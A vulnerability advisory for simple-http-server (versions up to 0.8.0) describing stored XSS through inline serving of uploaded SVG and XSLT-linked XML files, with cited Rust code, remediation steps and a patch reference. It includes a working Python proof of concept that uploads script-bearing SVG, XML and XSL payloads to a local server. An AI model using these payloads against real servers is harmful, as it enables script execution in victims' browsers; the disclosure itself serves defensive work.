---
lang: en
title: "Stored XSS via inline serving of uploaded SVG/XML files (no `Content-Disposition` / `nosniff`)"
project: simple-http-server
cwe:
  - CWE-79
  - CWE-434
severity: medium
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
score: "6.1"
verified: "0.8.0"
affected: "<= 0.8.0"
patched: "fee46b1"
date: 2026-08-21
---

### Summary

> ![tip]
> This vulnerability was patched in the following commit.
> [Merge commit from fork · TheWaWaR/simple-http-server@fee46b1 · GitHub](https://github.com/TheWaWaR/simple-http-server/commit/fee46b1ed1c569ebf493fbbd271323804570668e)

In a configuration where user-uploaded files are served, a Stored XSS exists: **an attacker uploads an SVG containing `<script>` and lures a victim into opening its URL**, resulting in **arbitrary JavaScript execution on the serving origin**.
In addition, on browsers that support XSLT, an XSLT-based XSS is possible through the same mechanism.

- **Confirmed version:** simple-http-server `0.8.0`
- **Affected versions:** `<= 0.8.0`
- **Precondition:** The application statically serves attacker-controlled files (e.g., uploads).

### Details

This application has no feature to set `Content-Disposition`.
As a result, the browser's behavior depends solely on the **MIME type**.

#### No `Content-Disposition`

`send_file` determines the **MIME type**.
`mime_guess` returns `image/svg+xml`, but because **there is no `Content-Disposition`**, the browser displays it **inline**.
Since `svg+xml` can contain `<script>` internally, Stored XSS is established.

**`src/handlers.rs: fn send_file()` (L855, L877~879):**

```rust
let mime = mime_guess::from_path(path).first_or_octet_stream(); // L855
//...
response
    .headers_mut()
    .insert(header::CONTENT_TYPE, header_value(mime.essence_str()));
```

| Content-Type    | `type` / `subtype` / `suffix` | Category   | Script execution                      |
| --------------- | ----------------------------- | ---------- | ------------------------------------- |
| `image/svg+xml` | `image` / `svg+xml` / `xml`   | **inline** | **Yes** <- issue                      |
| `text/xml`      | `text` / `xml` / -            | **inline** | **Yes, via XSLT (browser-dependent)** |

> `mime.essence_str()` strips only parameters (such as `charset`) and preserves the `+xml` suffix of `image/svg+xml`. Therefore the served `Content-Type` is exactly `image/svg+xml`.

#### Note on XSLT-based XSS

If XML served as `text/xml` contains `<?xml-stylesheet type="text/xsl" href="poc.xsl"?>`, the browser performs a client-side XSLT transformation, and a `<script>` contained in the output may execute (a same-origin stylesheet is required; in this PoC, `poc.xml` and `poc.xsl` are on the same server, i.e., the same origin, so it holds).
However, unlike XSS via direct SVG display, **XSLT-based XSS depends on the browser implementation**.

#### Remediation

1. Add `Content-Disposition: attachment` to force download instead of inline display.
2. Force `attachment` only for dangerous MIME types.
3. Use `X-Content-Type-Options: nosniff` + CSP.

### PoC

```python
#!/usr/bin/env python3

"""Stored XSS PoC: serve uploaded files inline and execute JS on the origin.

1. Start the server with upload enabled and a fixed CSRF token.
2. Upload the malicious payloads via multipart/form-data.
3. Open the printed URLs in a browser to confirm the alerts fire.

Payloads:
  - poc.svg : inline image/svg+xml with an embedded <script>.
  - poc.xml : text/xml referencing poc.xsl via xml-stylesheet.
  - poc.xsl : XSLT stylesheet that emits <script> when poc.xml is rendered.
"""

import os
import subprocess
import time
import urllib.request

HOST = "127.0.0.1"
PORT = 8888
SERVE_DIR = "uploads"
CSRF_TOKEN = "poc-token"

# (filename, content-type, body). Files are served back at /<filename>.
PAYLOADS = [
    (
        "poc.svg",
        "image/svg+xml",
        '<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">\n'
        "  <script>alert('XSS on ' + document.domain)</script>\n"
        "</svg>\n",
    ),
    (
        "poc.xml",
        "text/xml",
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<?xml-stylesheet type="text/xsl" href="poc.xsl"?>\n'
        "<root>text/xml XSLT-XSS PoC</root>\n",
    ),
    (
        "poc.xsl",
        "text/xml",
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<xsl:stylesheet version="1.0"\n'
        '    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
        '  <xsl:output method="html"/>\n'
        '  <xsl:template match="/">\n'
        '    <html xmlns="http://www.w3.org/1999/xhtml">\n'
        "      <body>\n"
        "        <h2>text/xml XSLT-XSS PoC</h2>\n"
        "        <script>alert('XSLT-XSS on ' + document.domain)</script>\n"
        "      </body>\n"
        "    </html>\n"
        "  </xsl:template>\n"
        "</xsl:stylesheet>\n",
    ),
]

VERIFY = ["poc.svg", "poc.xml"]

base_url = f"http://{HOST}:{PORT}"

# The server requires the root directory to exist.
os.makedirs(SERVE_DIR, exist_ok=True)

# Start the server.
server = subprocess.Popen(
    ["cargo", "run", "--", "-p", str(PORT), "-u", "--csrf", CSRF_TOKEN, SERVE_DIR],
)

# Wait until it accepts connections.
for _ in range(60):
    try:
        urllib.request.urlopen(base_url, timeout=1)
        break
    except urllib.error.HTTPError:
        break
    except OSError:
        time.sleep(1)

# Build one multipart/form-data body carrying the CSRF token and every payload.
boundary = "----pocboundary"
parts = [
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="csrf"\r\n\r\n'
    f"{CSRF_TOKEN}\r\n"
]
for filename, content_type, body_text in PAYLOADS:
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="files"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
        f"{body_text}\r\n"
    )
parts.append(f"--{boundary}--\r\n")
body = "".join(parts).encode()

req = urllib.request.Request(
    base_url,
    data=body,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    method="POST",
)
with urllib.request.urlopen(req) as resp:
    resp.read()

print("\nUploaded. Open in a browser to confirm XSS:")
for name in VERIFY:
    print(f"  {base_url}/{name}")
print()

server.wait()
```

### Impact

Arbitrary JavaScript execution on the serving origin is expected to enable the standard consequences of a Stored XSS.
